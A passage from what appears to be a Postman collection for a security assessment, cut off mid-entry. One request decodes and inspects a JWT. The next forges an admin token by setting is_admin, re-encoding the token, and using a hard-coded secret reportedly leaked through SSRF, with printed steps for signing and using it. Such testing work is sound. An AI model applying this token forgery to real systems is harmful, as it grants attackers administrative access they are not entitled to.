        {
          "name": "F3 - JWT Token Decode & Verify",
          "event": [
            {
              "listen": "test",
              "script": {
                "exec": [
                  "// Get the token from environment\r",
                  "let token = pm.environment.get(\"jwt_token\");\r",
                  "\r",
                  "// Decode the payload (middle part)\r",
                  "let base64Url = token.split('.')[1];\r",
                  "let base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');\r",
                  "let payload = JSON.parse(atob(base64));\r",
                  "\r",
                  "// Log to console\r",
                  "console.log(\"🔑 JWT Payload:\", payload);\r",
                  "\r",
                  "// Check if token has expiration\r",
                  "if (payload.exp) {\r",
                  "    console.log(\"✅ Token expires at:\", new Date(payload.exp * 1000));\r",
                  "} else {\r",
                  "    console.log(\"❌ WARNING: Token has NO expiration!\");\r",
                  "}\r",
                  "\r",
                  "// Check if is_admin\r",
                  "if (payload.is_admin) {\r",
                  "    console.log(\"👑 Admin token detected!\");\r",
                  "} else {\r",
                  "    console.log(\"👤 Regular user token\");\r",
                  "}\r",
                  "\r",
                  "// Save to environment for reference\r",
                  "pm.environment.set(\"decoded_payload\", JSON.stringify(payload));"
                ],
                "type": "text/javascript",
                "packages": {},
                "requests": {}
              }
            }
          ],
          "protocolProfileBehavior": {
            "disableBodyPruning": true
          },
          "request": {
            "auth": {
              "type": "bearer",
              "bearer": [
                {
                  "key": "token",
                  "value": "{{jwt_token}}",
                  "type": "string"
                }
              ]
            },
            "method": "GET",
            "header": [
              {
                "key": "Content-Type",
                "value": "application/json",
                "type": "text"
              }
            ],
            "body": {
              "mode": "raw",
              "raw": ""
            },
            "url": {
              "raw": "{{base_url}}/dashboard",
              "host": [
                "{{base_url}}"
              ],
              "path": [
                "dashboard"
              ]
            }
          },
          "response": []
        },
        {
          "name": "F3b - JWT Admin Token Forgery",
          "event": [
            {
              "listen": "prerequest",
              "script": {
                "exec": [
                  "// Get current token\r",
                  "let originalToken = pm.environment.get(\"jwt_token\");\r",
                  "\r",
                  "// Decode the payload\r",
                  "let parts = originalToken.split('.');\r",
                  "let header = JSON.parse(atob(parts[0]));\r",
                  "let payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));\r",
                  "\r",
                  "// Modify payload to make admin\r",
                  "payload.is_admin = true;\r",
                  "\r",
                  "// Also add expiration (optional but more realistic)\r",
                  "payload.exp = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now\r",
                  "\r",
                  "// Encode back to base64\r",
                  "let newHeader = btoa(JSON.stringify(header));\r",
                  "let newPayload = btoa(JSON.stringify(payload))\r",
                  "    .replace(/\\+/g, '-')\r",
                  "    .replace(/\\//g, '_')\r",
                  "    .replace(/=/g, '');\r",
                  "\r",
                  "// Secret (from our SSRF finding)\r",
                  "let secret = \"secret123\";\r",
                  "\r",
                  "// For HS256, we need to sign it\r",
                  "// Postman can't sign JWTs directly, so we'll show the forged token in console\r",
                  "console.log(\"🔧 FORGED ADMIN TOKEN (unsigned):\");\r",
                  "console.log(newHeader + \".\" + newPayload);\r",
                  "\r",
                  "console.log(\"\\n📝 TO USE:\");\r",
                  "console.log(\"1. Go to https://jwt.io\");\r",
                  "console.log(\"2. Paste this token\");\r",
                  "console.log(\"3. Add secret: \" + secret);\r",
                  "console.log(\"4. Copy signed token\");\r",
                  "console.log(\"5. Use in Authorization header\");\r",
                  "\r",
                  "// Save unsigned token to environment\r",
                  "pm.environment.set(\"forged_token_unsigned\", newHeader + \".\" + newPayload);"
                ],
                "type": "text/javascript",
                "packages": {},
                "requests": {}
              }
            },
            {
              "listen": "test",
              "script": {
                "exec": [
                  "console.log(\"\\n📊 CURRENT TOKEN vs FORGED TOKEN:\");\r",
                  "console.log(\"Original is_admin:\", pm.environment.get(\"jwt_token\").includes('\"is_admin\":true') ? \"✅ Admin\" : \"👤 Regular\");\r",
                  "console.log(\"Check console above for forged token instructions\");"
                ],
                "type": "text/javascript",
                "packages": {},
                "requests": {}
              }
            }
          ],
          "protocolProfileBehavior": {
            "disableBodyPruning": true
          },
          "request": {
            "auth": {
              "type": "bearer",
              "bearer": [
